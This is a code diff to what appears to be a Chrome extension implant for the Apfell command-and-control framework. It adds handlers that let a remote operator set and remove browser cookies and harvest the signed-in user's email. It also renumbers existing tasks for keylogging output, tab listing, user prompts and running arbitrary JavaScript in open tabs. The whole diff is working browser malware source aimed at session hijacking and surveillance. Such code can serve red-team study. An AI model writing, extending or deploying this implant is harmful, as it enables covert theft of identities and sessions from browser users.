@@ -12,7 +12,7 @@ class SporeConfiguration {
         }
 
         this.apfellID = 0;
-        this.username = chrome.identity.AccountInfo;
+        this.username = '';
         this.pid = 0;
         this.hostname = "chrome";
         this.UUID = uuid;
@@ -21,6 +21,10 @@ class SporeConfiguration {
 }
 
 const config = new SporeConfiguration("blah", "127.0.0.1", "websocket", 443, true);
+// Get the username
+chrome.identity.getProfileUserInfo(function(info){
+    config.username = info.email;
+});
 // Connect to the server
 const connection = new WebSocket(config.serverurl);
 let out = [];
@@ -127,7 +131,7 @@ setInterval(function(){
             case 'custom': {
                 // catch output from custom javascript injected into tabs
                 let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
-                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 9, payload);
+                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 10, payload);
                 const meta = {};
                 meta.type = 3;
                 meta.metadata = envelope;
@@ -232,8 +236,47 @@ setInterval(function(){
 
 
                 } else if (tasktype === 4) {
-                    // TODO: Implement task code for setting a cookie value
-                } else if (tasktype === 5) {
+                    // TODO: Implement task code for setting a cookie
+                    let details = JSON.parse(atob(data['data'].toString()));
+
+                    chrome.cookies.set(details, function(cookie){
+                        let resp;
+                        if (cookie === null) {
+                            resp = JSON.stringify(chrome.runtime.lastError);
+                        } else {
+                            resp = JSON.stringify(cookie);
+                        }
+
+                        const data = btoa(unescape(encodeURIComponent(resp)));
+                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                        let meta = {};
+                        meta["metatype"] = 3;
+                        meta["metadata"] = apfellMsg;
+                        const metaenvelope = JSON.stringify(meta);
+                        out.push(metaenvelope);
+                    });
+                } else if (tasktype === 5){
+                    // TODO: Add code to remove cookies
+                    let details = JSON.parse(atob(data['data'].toString()));
+
+                    chrome.cookies.remove(details, function(cookie){
+                        let resp;
+                        if (cookie === null) {
+                            resp = JSON.stringify(chrome.runtime.lastError);
+                        } else {
+                            resp = JSON.stringify(cookie);
+                        }
+
+                        const data = btoa(unescape(encodeURIComponent(resp)));
+                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                        let meta = {};
+                        meta["metatype"] = 3;
+                        meta["metadata"] = apfellMsg;
+                        const metaenvelope = JSON.stringify(meta);
+                        out.push(metaenvelope);
+                    });
+
+                } else if (tasktype === 6) {
                     // TODO: List all open tabs with window titles
                     const queryInfo = {};
                     let tabs =[];
@@ -260,7 +303,7 @@ setInterval(function(){
                     });
 
 
-                } else if (tasktype === 6) {
+                } else if (tasktype === 7) {
                     chrome.identity.getProfileUserInfo(function(info){
                         const data = btoa(unescape(encodeURIComponent((info.email))));
                         const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
@@ -270,10 +313,17 @@ setInterval(function(){
                         const metaenvelope = JSON.stringify(meta);
                         out.push(metaenvelope);
                     });
-                } else if (tasktype === 7) {
+                } else if (tasktype === 8) {
                     // form capture
                     // TODO: Form capture code
-                } else if (tasktype === 8) {
+                    const data = btoa(unescape(encodeURIComponent(('Not implemented'))));
+                    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                    let meta = {};
+                    meta["metatype"] = 3;
+                    meta["metadata"] = apfellMsg;
+                    const metaenvelope = JSON.stringify(meta);
+                    out.push(metaenvelope);
+                } else if (tasktype === 9) {
                     // prompt
 
                     let txt = atob(data['data']);
@@ -292,7 +342,7 @@ setInterval(function(){
                     meta["metadata"] = apfellMsg;
                     const metaenvelope = JSON.stringify(meta);
                     out.push(metaenvelope);
-                } else if (tasktype === 9) {
+                } else if (tasktype === 10) {
                     // execute custom javascript code in a tab
                     let args = JSON.parse(atob(data['data'].toString()));
                     const tab = Math.round(args["tabid"]);
